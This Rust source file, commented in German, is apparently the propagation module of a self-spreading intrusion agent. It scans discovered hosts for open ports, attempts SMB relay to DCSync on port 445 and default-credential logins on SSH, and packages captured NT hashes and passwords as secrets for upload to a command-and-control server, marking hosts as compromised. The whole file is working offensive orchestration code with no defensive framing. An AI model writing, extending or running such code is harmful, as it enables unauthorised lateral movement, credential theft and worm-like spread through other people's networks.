//! Propagationslogik: Scan → Service-Identifikation → Exploit.
//!
//! Führt einen TCP-Connect-Scan auf entdeckten Hosts aus, identifiziert die
//! Dienste über ein lokales Port-Mapping und versucht gezielte Exploits
//! (SMB-Relay für Windows/445, Credential-Stuffing für SSH).

use std::net::IpAddr;

use kx_exploit::{smb_relay_dcsync, try_default_credentials, RelayConfig};
use kx_scanner::{scan_tcp, DiscoveredHost, ScanResults};
use tracing::{debug, info, warn};

use crate::c2::{HostPayload, SecretPayload};

/// Ergebnis eines Propagationslaufs.
pub struct PropagationResults {
    /// Quell-Host (der aktuelle Agent).
    pub source_host: String,
    /// Neuentdeckte Hosts für die C2-Registrierung.
    pub new_hosts: Vec<HostPayload>,
    /// Neuerbeutete Secrets für den C2-Upload.
    pub new_secrets: Vec<SecretPayload>,
}

/// Mappt einen TCP-Port auf einen Dienstnamen (einfache Heuristik).
fn service_for_port(port: u16) -> &'static str {
    match port {
        22 => "ssh",
        23 => "telnet",
        25 => "smtp",
        80 => "http",
        443 => "https",
        1433 => "mssql",
        1521 => "oracle",
        3306 => "mysql",
        5432 => "postgres",
        5900 => "vnc",
        8080 => "http-proxy",
        8443 => "https-alt",
        2375 | 2376 => "docker",
        445 => "smb",
        135 => "msrpc",
        _ => "unknown",
    }
}

/// Führt die vollständige Propagations-Schleife aus.
pub async fn run_propagation(
    discovered: &[DiscoveredHost],
    relay_script: &str,
    _wmi_script: &str,
) -> PropagationResults {
    let mut results = PropagationResults {
        source_host: String::new(),
        new_hosts: Vec::new(),
        new_secrets: Vec::new(),
    };

    if discovered.is_empty() {
        debug!("Keine Hosts entdeckt — Propagation beendet");
        return results;
    }

    let ips: Vec<IpAddr> = discovered.iter().map(|h| h.ip).collect();
    info!("TCP-Scan auf {} Hosts", ips.len());
    let scan: ScanResults = scan_tcp(&ips, kx_scanner::COMMON_PORTS, 1000).await;

    for (host, ports) in &scan.open_ports {
        for port in ports {
            let service = service_for_port(*port);
            info!("Offener Port {} auf {} ({})", port, host, service);

            // Windows + SMB (445) → SMB-Relay→DCSync.
            if *port == 445 {
                let relay_cfg = RelayConfig {
                    target: host.to_string(),
                    username: None,
                    password: None,
                    script_path: relay_script.to_string(),
                    domain: None,
                };
                match smb_relay_dcsync(&relay_cfg).await {
                    Ok(creds) => {
                        info!("SMB-Relay: {} Credentials erbeutet", creds.len());
                        for c in creds {
                            results.new_secrets.push(SecretPayload {
                                cred_type: "nt_hash".into(),
                                username: c.username,
                                password: c.hash,
                                source: "smb_relay".into(),
                            });
                        }
                        results.new_hosts.push(HostPayload {
                            ip: host.to_string(),
                            hostname: None,
                            os: Some("Windows".into()),
                            status: Some("compromised".into()),
                        });
                    }
                    Err(e) => warn!("SMB-Relay fehlgeschlagen: {e}"),
                }
            }

            // SSH (22) → Default-Credentials.
            if service == "ssh" {
                if let Ok(Some(auth)) =
                    try_default_credentials(&host.to_string(), service).await
                {
                    results.new_secrets.push(SecretPayload {
                        cred_type: "password".into(),
                        username: auth.username,
                        password: auth.password,
                        source: "default_creds".into(),
                    });
                    results.new_hosts.push(HostPayload {
                        ip: host.to_string(),
                        hostname: None,
                        os: None,
                        status: Some("compromised".into()),
                    });
                }
            }

            // Jeden Host mit offenem Port als neu registrieren.
            results.new_hosts.push(HostPayload {
                ip: host.to_string(),
                hostname: None,
                os: None,
                status: Some("discovered".into()),
            });
        }
    }

    results
}
